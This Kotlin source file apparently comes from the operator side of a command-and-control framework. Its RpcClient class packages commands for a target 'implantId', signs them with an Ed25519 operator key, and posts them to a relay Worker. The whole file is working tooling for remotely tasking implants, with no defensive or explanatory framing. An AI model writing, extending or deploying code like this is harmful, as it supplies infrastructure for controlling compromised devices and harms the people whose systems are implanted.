package com.shadow.operator.data

import android.util.Log
import java.net.URL
import javax.net.ssl.HttpsURLConnection

/**
 * Sends signed RPC commands to the Worker's /api/rpc endpoint.
 * Each command is signed with the operator's Ed25519 private key.
 * The Worker verifies against the operator's public key.
 */
class RpcClient(private val config: ClientConfig) {
    private companion object {
        const val TAG = "RpcClient"
        const val TIMEOUT_MS = 15000
    }

    /**
     * Send a signed RPC command to the Worker.
     * @return JSON response body, or null on failure
     */
    fun sendCommand(implantId: String, command: String, payload: String): String? {
        return try {
            val body = buildString {
                append("{")
                append("\"implantId\":\"$implantId\",")
                append("\"command\":\"$command\",")
                append("\"payload\":$payload")
                append("}")
            }
            val timestamp = (System.currentTimeMillis() / 1000).toString()
            val signature = Ed25519Signer.signRpc(
                config.operatorPrivKey, timestamp, body
            ) ?: return null

            val workerHttpUrl = config.workerUrl
                .replace("wss://", "https://")
                .replace("/t/wss/", "/")

            val url = URL("$workerHttpUrl/api/rpc")
            val conn = url.openConnection() as HttpsURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = TIMEOUT_MS
            conn.readTimeout = TIMEOUT_MS
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Signature", signature)
            conn.setRequestProperty("X-Timestamp", timestamp)

            conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }

            val code = conn.responseCode
            if (code == 200) {
                conn.inputStream.bufferedReader().use { it.readText() }
            } else {
                Log.e(TAG, "RPC failed: HTTP $code - ${conn.errorStream?.bufferedReader()?.use { it.readText() }}")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "RPC error", e)
            null
        }
    }
}
